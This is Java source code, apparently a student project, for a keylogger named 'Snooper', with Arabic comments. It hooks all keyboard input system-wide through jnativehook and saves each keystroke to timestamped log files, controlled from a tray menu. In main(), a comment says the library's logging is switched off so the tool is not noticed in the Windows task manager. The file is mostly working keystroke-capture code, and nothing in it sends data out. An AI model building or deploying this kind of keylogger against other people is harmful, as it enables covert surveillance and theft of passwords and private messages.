package com.snooper.tray;

import com.snooper.*;
import com.snooper.app.*;
import com.snooper.app.controller.*;
import com.snooper.app.controller.UsersController;

// استخدام مكتبة jnativehook للكشف عن احداث الماوس ولوحة المفاتيح
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyAdapter;

import java.util.logging.*;
//مكتبه لأستيراد وظائف الادخال والاخراج
import java.io.*;
import java.awt.*;
import java.awt.event.*;

public class Snooper extends NativeKeyAdapter implements Disposable {
  
    //Static يعتبر مشترك بين جميع الكائنات من نفس الكلاس //المتغير هنا سيتم تعريفه مرة واحدة في الذاكرة و جميع الكائنات من نفس الكلاس ستشير إليه بدل أن تملك نسخة خاصة منه
    //final قيمة, لا يمكن تغييرها من جديد//قيمته مرة واحدة فقط
          // متغيرات تمهيد لملف الذي سيتم فيه تخزين الاحرف الملتقطه
    
    
    
        public static String FOLDER = ""+FOLDER()+"";
        public static final String DASH = "/";
        public static final String START_NAME = "log_";
	public static final String EXTENSION_NAME = ".slog";
	public static final int SECOND_IN_MILLI = 1_000;//تنسيق بالملي ثانية
	public static final int HOUR_IN_MILLI = SECOND_IN_MILLI * 60 * 60;// تنسيق بالملي في الساعه
        // تنسيق الوقت هو نفس هذا لاكننا عملناه بذلك الشكل كي يكون قصيرا مثل =202105151133010041 
    //    SECOND_IN_MILLIS = 1000;
    //MINUTE_IN_MILLIS = SECOND_IN_MILLIS * 60;
    //public static final long HOUR_IN_MILLIS = MINUTE_IN_MILLIS * 60;
    //public static final long DAY_IN_MILLIS = HOUR_IN_MILLIS * 24;
    //public static final long WEEK_IN_MILLIS = DAY_IN_MILLIS * 7;
        
	public static final String fileNameFormat = "yyyyMMddHHmmssSSSS";
	public static final String perHourFormat = "yyyy, MM/dd, h:mma";
	public static final String TITLE = "Keylogger Monitring";
	public static final String AUTHOR = "Abdalwahab Alshahari ^_^"; // >JSON >>robertoguazon
	
        //متغيرات ملف الجايسون الذي سيقوم بالتعديل في الملف بدون الاضرار به
        // من خلال حفظ بيانات الكائن بشكل بتتات
	public static final String PREF_FOLDER = "data";
	public static final String PREF_NAME = "pref";
	public static final String PREF_EXTENSION_NAME = ".json";
	public static final String PREF_FILEPATH = PREF_FOLDER + DASH + PREF_NAME + PREF_EXTENSION_NAME;

        
        /// متغيرات الملف
	private File folderFile; // متغير مجلد الملف الاصل الذي سيخزن فيه ملفات السجل
	private File keyStrokesFile;//متغير ملفات السجل التي ستكون تنشأ بعد كل يوم
	private File tempFile; // ملف مؤقت في حال التجربه او حدثت مشاكل يتم التخزين فيه
	private String keyStrokesFilePath; // مسار ملفات السجل
	private String tempFilePath; // مسار ملف السجل الخاص بالتجربه
	
	private String startDate; // متغير نص التاريخ
	
	private SnoopLogger sLogger; // كائن من كلاس التقاط ضربات لوحة المفاتيح
	
	private TrayIcon trayIcon; // كائن لايقونة شريط المهام التي في سطح المكتب
	private SystemTray tray; // كائن للقائمة التي ستظهر في شريط المهام
	private PopupMenu popup; // كائن لعناصر القائمة التي ستظهر في شريط المهام
	
	private boolean paused = false; // متغيير توقف الاتقاط لوحة المفاتيح
	
	private Pref pref; // كائن من كلاس التفضيلات والخصائص
	private static Snooper currentInstance; //الكائن الحالي - المثيل

        
        
    public static String FOLDER() {
//        UsersController s = new UsersController();
//        String FOLDER__;
//        FOLDER__ = s.toString();
//        return FOLDER__.toString();
       UsersController s = new UsersController();
        String G = "";
     //  G = s.nameU_ser.getText();
        return FOLDER;

    }

	public static Snooper getInstance() {
		return currentInstance;//المثيل الحالي
	}
	
        //استدعاء كلاس pref
	public Pref getPref() { //جلب فيمة الكائن المخزنة عند التهيئة بعد استرجاع قيم التخصيص الاخيره عبر util
		return pref;
	}
	
        //علبة النظام باسم منطقة حالة شريط المهام
	public TrayIcon getTrayIcon() {
		return trayIcon;
	}
	
        // داله للحصول على ملف ضربات المفاتيح
	public File getKeyStrokesFile() {
		return keyStrokesFile;
	}
	//كونستراكتور
	public Snooper() { // يتم جلب البيانات السابقة وتحويلها الا بتات عبر جيسون حتى لا يتضرر الحدث السابق
		currentInstance = this;
		pref = Util.loadPref();//>>استرجاع تفضيلات التصميم  //استرجاع حاله السجل او انشاء سجل جديدالخاص بالاداء حسب الحدث السابق
                
                //https://userpages.umbc.edu/~emurian/learnJava/swing/tutor/v2/explanations/Explain21.html
		pref.init();// استرجاع تفضيلات التصميم السابقة
		
		init(); //  تهيئة ملف الاتقاط
		initSystemTray();//تهيئة علبة النظام لاسستقبال
                
		start();//Util.notif(TITLE, "Starting ..."); اشعار بدء عمل البرنامج
	}
	
	//init of the base of the program
        //// init من أساس البرنامج
        
	public void init() { // تهيئة لبدء البرنامج
		folderFile = new File(FOLDER); // snoop_log ملف السجل
		startDate = Util.getCurrentDate(fileNameFormat); // الوقت الحالي
		keyStrokesFilePath = FOLDER + DASH + START_NAME + startDate + EXTENSION_NAME; // ".slog" =EXTENSION_NAME صيغة ملف السجل
		keyStrokesFile = new File(keyStrokesFilePath);
		tempFilePath = FOLDER.toString() + DASH + START_NAME + "temp" + EXTENSION_NAME;
		tempFile = new File(tempFilePath); // يتم الالتقاط في ملف التيم مؤقتا ثم يتم تحويل اسم الملف
		
		if (Util.hasInstance(tempFilePath)) {
			System.exit(0); //exit app if already has a temp file to log into
                        //الخروج من التطبيق إذا كان لديك بالفعل ملف مؤقت لتسجيل الدخول
                        //يتحقق مما إذا كان الملف قد تم إنشاؤه بالفعل
		}
		
		sLogger = new SnoopLogger(tempFilePath);// وضح معلومات الملف  داخل كنسراكتور كلاس SnoopLogger
		
                //https://www.javatpoint.com/ShutdownHook-thread
                //يمكن استخدام خطاف الإغلاق لإجراء مورد التنظيف أو حفظ الحالة عند إيقاف تشغيل JVM بشكل طبيعي أو بشكل مفاجئ. يعني إجراء تنظيف استهلاك الموارد إغلاق ملف السجل أو إرسال بعض التنبيهات أو أي شيء آخر. لذلك إذا كنت تريد تنفيذ بعض التعليمات البرمجية قبل إيقاف تشغيل JVM ، فاستخدم ربط إيقاف التشغيل.
		Runtime.getRuntime().addShutdownHook(new Thread(()-> {
			dispose(); //لتوقيف الالتقاط  اذا لم يكون هناك حروف مخزنة في الذاكرة يتم تخزينه من خلال الالتقاط
		}));
	}
	
	//init of system tray
        // بدء تهيئة قائمة شريط المهام
	public void initSystemTray() {
            
            //java.awt; الكلاس والداله تتبع مكتبة 
		if (!SystemTray.isSupported()) {
			System.err.println("قائمة شريط المهام غير مدعومة من النظام نفسه");
		}
		tray = SystemTray.getSystemTray();
		trayIcon = new TrayIcon(Util.createAwtImage("images/snooper.png","Keylogger Mointring"));
		try {
			tray.add(trayIcon);
		} catch (Exception ex) {
			ex.printStackTrace();//استثناء لخطأ منطقي يحدث أثناء تشغيل البرنامج - يقوم الاستثناء بطباعة تتبع المكدس 
                        //https://harmash.com/java/java-exceptions/
		}
		
		popup = new PopupMenu();
		MenuItem about = new MenuItem("حول المشروع");
		MenuItem pause = new MenuItem("ايقاف");
		MenuItem openCurrentFolder = new MenuItem("فتح مجلد السجلات الحالي");
		MenuItem openCurrentLog = new MenuItem("فتح ملف السجل الحالي");
		MenuItem clearCurrentLog = new MenuItem("مسح السجل الحالي");
		MenuItem exit = new MenuItem("خروج");
		
		popup.add(about);
		popup.addSeparator();
		popup.add(pause);
		popup.add(openCurrentFolder);
		popup.add(openCurrentLog);
		popup.add(clearCurrentLog);
		popup.addSeparator();
		popup.add(exit);
		
		trayIcon.setImageAutoSize(pref.isIconImageAutoSize()); // افتراضي
		
		pref.iconImageAutoSizeProperty().addListener((o,ov,nv) -> { // ايقونه شريط سطح المكتب والاشعار
			trayIcon.setImageAutoSize(nv);
		});
		
		trayIcon.setToolTip("Keylogger Mointring"); // تعيين نلميح للايقونه
		trayIcon.setPopupMenu(popup);
		
                //
		trayIcon.addActionListener(event -> {  // عند الضعط على الايقونه يتم استدعاء الواجهات اي الواجه الرئيسية
			KSApplication.show();
		});
		
		about.addActionListener(event -> {
			Util.notif(TITLE, "by " + AUTHOR); // AUTHORرساله ب اسم المستخدم
		});
		
		pause.addActionListener(event -> { // تشغيل وايقاف المسجل
			paused = !paused;
			if (paused) {
				Util.notif(TITLE, "توقف...");
				pause.setLabel("تشغيل");
			} else {
				Util.notif(TITLE, "استمرار...");
				pause.setLabel("توقف");
			}
		});
		
		openCurrentFolder.addActionListener(event -> { //عند النقر على العنصر يتم فتح مجلد السجل الحالي
			try {
				Desktop.getDesktop().open(folderFile);
			} catch (Exception ex) {
				Util.notif(TITLE, "خطأ في فتح مجلد السجل الحالي..." + AUTHOR);
			}
		});
		
		openCurrentLog.addActionListener(event -> { // عند النقر على العنصر يتم فتح السجل الحالي
			Util.openFileDefault(sLogger.getLogFile());
		});
		
		clearCurrentLog.addActionListener(event -> {
			sLogger.clear(); // حذف SnoopLogger(tempFilePath)
		});
		
		exit.addActionListener(e -> {
			Util.notif(TITLE, "خروج ...");
			tray.remove(trayIcon);
			System.exit(0);
		});
	}
	
	public void start() {
		Util.notif(TITLE, "بدء تشغيل البرنامج ...");
	}
	
        // داله الالتقاط الى داخل الملف
    public void nativeKeyReleased(NativeKeyEvent e) {
        try {
			if (sLogger.getWriter() == null || paused) return;
//يتم إنشاء هذا الحدث ذي المستوى المنخفض بواسطة النظام الأصلي عند الضغط على مفتاح أو تحريره بشكل مستقل عن تركيز مكون Java. يتم تمرير الحدث إلى كل كائن NativeKeyListener تم تسجيله لتلقي الأحداث الرئيسية العالمية باستخدام طريقة
//https://javadoc.io/static/com.1stleg/jnativehook/2.0.3/org/jnativehook/keyboard/NativeKeyEvent.html

			sLogger.snoopLog(NativeKeyEvent.getKeyText(e.getKeyCode()));// عملية الاتقاط
		} catch(Exception ex) {
			ex.printStackTrace();
		}
    }

    
    //دالة التنفيذ الاولى
    public static void main(String[] args) {
//        UsersController();

 
        
		if (args.length > 0 && args[0].equals("test")) {
			test();
			return;
		}
		//Logger
                //package java.util.logging; تابعه للمكتبه
                //توفر القدرة على تتبع أخطاء وتسجيل الاحداث
//                package java.util.logging;
// ستم جلب حزمة الالتقاط وتشغيلها
		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.OFF);//قمنا بتعطيل سجلات الاحداث من اجل عدم رصده في مدير المهام الخاص بالويندوز
		logger.setUseParentHandlers(false); // هنا قمنا بايقاف معالجات الاخطاء ايضا
        try {
            GlobalScreen.registerNativeHook(); // تشغيل تسجيل الاتقاط لضغطات لوحة المفاتيح الأصلي لنظام التشغيل
        }
        catch (NativeHookException ex) {
            System.err.println("حدثت مشكلة في تسجيل الخطاف الأصلي.");
            System.err.println(ex.getMessage());

            System.exit(1);//إنهاء البرنامج الحالي //تستخدم القيمة الغير صفرية لرمز الحاله عموما للاشاره الى انهاء غير طبيعية
        }

        //استدعاء كنستركت بدء الالتقاط في متبع الاخطاء
        GlobalScreen.addNativeKeyListener(new Snooper());
		
                //استعاء ملف التنفيذ لواجهات البرنامج
		KSApplication.main(args);
    }
	
            //هذه الداله تعمل في حال كانت
	//method for testing args = test
	public static void test() {
		//test here
		
		/* //test serialization
		*/
		//test SnoopReader Episode 12
		SnoopReader sReader = new SnoopReader(FOLDER + DASH + "log_201706011232550817.slog");
		sReader.printSnoopKeys();
		System.out.println("has same key, index [5 and 6]: " + sReader.hasSameKey(5,6));
		System.out.println("has same key, index [3 and 6]: " + sReader.hasSameKey(3,6));
		System.out.println("has same keys, indexes [0, 10 and 57]: " + sReader.hasSameKeys(0,10,57));
	}
	
	//called when the program is aout to exit or shutdown
        //يتم استدعاؤه عندما يكون البرنامج خارجً للخروج أو إيقاف التشغيل
	@Override
	public void dispose() {
            //interface Disposable
            //تحرير الموارد غير المداره اي غير المستخدمه
            //سيكتشف إطار العمل هذا أنه لم تعد هناك حاجة إلى كائن بمجرد عدم التقاط ضربات لوحة المفاتيح ويقوم بتحرير الذاكرة تلقائيً
		sLogger.dispose(); 
		sLogger.renameFile(keyStrokesFile);
	}
}